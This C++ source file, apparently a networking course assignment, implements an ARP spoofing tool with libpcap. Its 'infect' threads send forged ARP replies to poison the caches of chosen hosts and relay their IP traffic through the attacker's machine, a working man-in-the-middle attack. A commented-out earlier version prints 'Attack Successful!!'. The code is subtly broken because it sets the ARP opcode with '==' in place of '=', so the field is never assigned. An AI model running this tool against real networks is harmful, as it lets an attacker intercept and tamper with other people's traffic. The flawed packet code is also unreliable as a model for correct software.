#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"
#include <ifaddrs.h>
#include <string.h>
#include <iostream>
#include <net/if.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdio.h>
#include <map>
#include <list>
#include <thread>
#include <signal.h>

#pragma pack(push, 1)
struct EthArpPacket final{
	EthHdr eth_;
	ArpHdr arp_;
};

struct EthIpPacket final{
	EthHdr eth_;
	IPv4_hdr ip_;
};
#pragma pack(pop)

typedef struct packet_data{
	Mac sender_mac, target_mac;
	Ip sender_ip, target_ip;
} data_;

EthArpPacket packet;
Mac mac_mine;
Mac broadcast_mac = Mac::broadcastMac();
Mac nullmac = Mac::nullMac();
Ip ip_mine;
std::map<Ip, Mac> map_;
std::list<data_> list_;

void send_packet(pcap_t *handle, Mac eth_dmac, Mac eth_smac, int op, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip);
int rec_chk(EthHdr *eth_packet, data_ data);
int rel_chk(EthHdr *eth_packet, data_ data);

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

void mine(char *dev, Mac *mac_mine, Ip *ip_mine){
	int fd;
	struct ifreq ifr;
	const char *dev_ = dev;
	memset(&ifr, 0, sizeof(ifr));

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, dev_, IFNAMSIZ-1);
	
	if(ioctl(fd, SIOCGIFHWADDR, &ifr)==0){
		*mac_mine = Mac((uint8_t *)ifr.ifr_hwaddr.sa_data);
	}

	if(ioctl(fd, SIOCGIFADDR, &ifr)==0){
		*ip_mine = Ip(std::string(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr)));
	}
	close(fd);
	return;
}

Mac get_mac(pcap_t *handle, Ip Ip_){
	send_packet(handle, broadcast_mac, mac_mine, 1, mac_mine, ip_mine, nullmac, Ip_);

	while(1)
	{
		struct pcap_pkthdr *header;
		const u_char* reply;
		int res = pcap_next_ex(handle, &header, &reply);
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
		{
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return 0;
		}

		EthArpPacket *sender_;
		sender_ = (EthArpPacket *)reply;
		if (sender_->arp_.sip() == Ip_)
			return sender_->arp_.smac_;
		else
			continue;
	}
}

void send_packet(pcap_t *handle, Mac eth_dmac, Mac eth_smac, int op, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip){
	packet.eth_.dmac_ = eth_dmac;
	packet.eth_.smac_ = eth_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);

	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;

	if (op == 1)
		packet.arp_.op_ == htons(ArpHdr::Request);
	else if (op == 2)
		packet.arp_.op_ == htons(ArpHdr::Reply);
	else
		return;

	packet.arp_.smac_ = arp_smac;
	packet.arp_.sip_ = htonl(arp_sip);
	packet.arp_.tmac_ = arp_tmac;
	packet.arp_.tip_ = htonl(arp_tip);

	int send = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (send != 0){
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", send, pcap_geterr(handle));
	}
}

//EthArpPacket packet_maker(string eth_dmac, string eth_smac, uint16_t op, string arp_smac, string arp_sip, string arp_tmac, string arp_tip){
//	EthArpPacket packet;
//	//ether header
//	packet.eth_.dmac_ = Mac(eth_dmac);
//	packet.eth_.smac_ = Mac(eth_smac);
//	packet.eth_.type_ = htons(EthHdr::Arp);
//	
//	//arp header
//	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
//	packet.arp_.pro_ = htons(EthHdr::Ip4);
//	
//	packet.arp_.hln_ = Mac::SIZE;
//	packet.arp_.pln_ = Ip::SIZE;
//	
//	packet.arp_.op_ = htons(op);
//	
//	packet.arp_.smac_ = Mac(arp_smac);
//	packet.arp_.sip_ = htonl(Ip(arp_sip));
//
//	packet.arp_.tmac_ = Mac(arp_tmac);
//	packet.arp_.tip_ = htonl(Ip(arp_tip));
//
//	return packet;
//
//}

void list_put(pcap_t *handle, Ip Ip_, Mac Mac_){
	if(map_.find(Ip_) == map_.end())
	{
		Mac_ = get_mac(handle, Ip_);
		map_.insert({Ip_, Mac_});
		printf("get mac : %s\n", std::string(Mac_).data());
	}
	else
		return;
}

void infect(pcap_t *handle){
	while(1)
	{
		for (auto iter : list_){
			send_packet(handle, iter.sender_mac, mac_mine, 2, mac_mine, iter.target_ip, iter.sender_mac, iter.sender_ip);
		}
		sleep(1);
	}
}

void infect_rec(pcap_t *handle){
	struct pcap_pkthdr *header;
	const u_char *reply;
	while (1)
	{
		int send = pcap_next_ex(handle, &header, &reply);
		if (send == 0) continue;
		if (send == PCAP_ERROR || send == PCAP_ERROR_BREAK)
		{
			printf("pcap_next_ex return %d(%s)\n", send, pcap_geterr(handle));
			break;
		}
		EthHdr *eth_pkt = (EthHdr *)reply;

		for (auto iter : list_){
			if (rec_chk(eth_pkt, iter))
				send_packet(handle, iter.sender_mac, mac_mine, 2, mac_mine, iter.target_ip, iter.sender_mac, iter.sender_ip);
			if (rel_chk(eth_pkt, iter)){
				EthIpPacket *packet = (EthIpPacket*)eth_pkt;
				packet->eth_.smac_ = mac_mine;
				packet->eth_.dmac_ = iter.target_mac;
				int send = pcap_sendpacket(handle, reply, (header->len));
				if(send != 0)
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", send, pcap_geterr(handle));
			}
		}
	}
}

int rec_chk(EthHdr *eth_packet, data_ data){
	if (eth_packet->type() != EthHdr::Arp)
		return 0;
	EthArpPacket *packet = (EthArpPacket *)eth_packet;
	if (packet->arp_.op() != ArpHdr::Request)
		return 0;
	if (packet->arp_.tip() == data.target_ip)
		return 1;
	else
		return 0;
}

int rel_chk(EthHdr *eth_packet, data_ data){
	if(eth_packet->type() != EthHdr::Ip4)
		return 0;
	EthIpPacket *packet = (EthIpPacket*)eth_packet;
	if(packet->eth_.smac() == data.sender_mac)
		return 1;
	else
		return 0;
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	mine(dev, &mac_mine, &ip_mine);
	Mac mac_sender, mac_target;
	Ip ip_sender, ip_target;

	printf("%s\n", std::string(mac_mine).data());
	printf("%s\n", std::string(ip_mine).data());

	int cnt = ((argc-2)/2) + 1;

	for (int i = 1; i < cnt; i++){
		ip_sender = Ip(std::string(argv[2 * i]));
		ip_target = Ip(std::string(argv[2 * i + 1]));
		
		printf("sender : ");
		list_put(handle, ip_sender, mac_sender);
		printf("target : ");
		list_put(handle, ip_target, mac_target);

		packet_data data;
		data.sender_ip = ip_sender;
		data.target_ip = ip_target;
		data.sender_mac = map_[ip_sender];
		data.target_mac = map_[ip_target];
		list_.push_back(data);
	}

	std::thread th_1(infect, handle);
	std::thread th_2(infect_rec, handle);
	th_1.join();
	th_2.join();
	pcap_close(handle);
}
	//string ip_sender = argv[2];
	//string ip_target = argv[3];

	//char ip_mine[40];
	//string ip_mine = "";
	//string mac_mine = "";
	
	//unsigned char mac_sender[32] = {0,};
//	string mac_target = "";
//
//	unsigned char* mac_unknown;
//	char temp[32] = {0,};
//	struct ifreq req;
//
//	int fd = socket(AF_INET, SOCK_DGRAM, 0);
//	req.ifr_addr.sa_family = AF_INET;
//	strncpy(req.ifr_name, argv[1], IFNAMSIZ - 1);
//	ioctl(fd, SIOCGIFHWADDR, &req);
//
//	mac_unknown = (unsigned char*)req.ifr_hwaddr.sa_data;
//	sprintf((char*)temp, (const char*)"%02x:%02x:%02x:%02x:%02x:%02x", mac_unknown[0], mac_unknown[1], mac_unknown[2], mac_unknown[3], mac_unknown[4], mac_unknown[5]);
//	mac_mine = temp;
//	printf("mac : %s\n", mac_mine.c_str());
//
//	ioctl(fd, SIOCGIFADDR, &req);
//	//inet_ntop(AF_INET, req.ifr_addr.sa_data+2, ip_mine, sizeof(struct sockaddr));
//	ip_mine  = inet_ntoa(((struct sockaddr_in*)&req.ifr_addr)->sin_addr);
//
//	printf("ip : %s\n",ip_mine.c_str());
//	EthArpPacket start = packet_maker("ff:ff:ff:ff:ff:ff", mac_mine, 1, mac_mine, ip_mine, "00:00:00:00:00:00", ip_sender);
	//EthArpPacket packet;

	//packet.eth_.dmac_ = Mac("00:0f:00:80:64:ec");
	//packet.eth_.smac_ = Mac("00:0f:00:00:0b:0f");
	//packet.eth_.type_ = htons(EthHdr::Arp);

	//packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	//packet.arp_.pro_ = htons(EthHdr::Ip4);
	//packet.arp_.hln_ = Mac::SIZE;
	//packet.arp_.pln_ = Ip::SIZE;
	//packet.arp_.op_ = htons(ArpHdr::Reply);
	//packet.arp_.smac_ = Mac("00:0f:00:00:0b:0f");
	//packet.arp_.sip_ = htonl(Ip("192.168.192.188"));
	//packet.arp_.tmac_ = Mac("00:0f:00:80:64:ec");
	//packet.arp_.tip_ = htonl(Ip("192.168.192.223"));
	
//	while (1){
//		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&start), sizeof(EthArpPacket));
//		if (res != 0) {
//			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
//		}
//		struct pcap_pkthdr* hdr;
//		const u_char* second;
//		int res_next = pcap_next_ex(handle, &hdr, &second);
//
//		struct ether_header* eth;
//		eth = (struct ether_header*)second;
//
//		if (eth->ether_type == htons(0x0806)){
//			struct ether_arp* arp_;
//			arp_ = (struct ether_arp*)(second + sizeof(ether_header));
//			unsigned char mac_tmp[6];
//			memcpy(mac_tmp, arp_->arp_sha, sizeof(mac_tmp));
//			sprintf((char*)mac_sender, (const char*) "%02x:%02x:%02x:%02x:%02x:%02x", mac_tmp[0], mac_tmp[1], mac_tmp[2], mac_tmp[3], mac_tmp[4], mac_tmp[5]);
//			break;
//		}
//	}
//	string fin_mac_sender = "";
//	for (int i = 0; i < 21; i++) {
//		fin_mac_sender += mac_sender[i];
//	}
//	EthArpPacket atk = packet_maker(fin_mac_sender, mac_mine, 2, mac_mine, ip_target, fin_mac_sender, ip_sender);
//	int res_fin = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&atk), sizeof(EthArpPacket));
//	if (res_fin != 0 )
//	{
//		fprintf(stderr, "pcap_sendpakcet return %d error = %s\n", res_fin, pcap_geterr(handle));
//		return -1;
//	}
//	printf("Attack Successful!!\n");
//
//	pcap_close(handle);
